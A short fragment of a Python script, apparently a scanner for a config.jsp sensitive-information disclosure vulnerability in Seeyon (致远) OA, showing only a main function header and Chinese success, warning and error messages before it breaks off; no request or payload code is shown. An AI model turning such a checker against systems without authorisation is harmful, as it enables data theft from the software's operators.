...
def main(target_url):
    ...
    success_msg = now_time() + '[SUCCESS]存在致远OA config.jsp 敏感信息泄漏漏洞'
    shell_msg = now_time() + ':{}'.format(exp_url)
    warning_msg = now_time() + '[WARNING]可能不存在致远OA config.jsp 敏感信息泄漏漏洞'
    error_msg = now_time() + '[致远OA config.jsp 敏感信息泄漏漏洞][ERROR]请求失败，可能无法与目标建立连接或目标不存在'
    try:
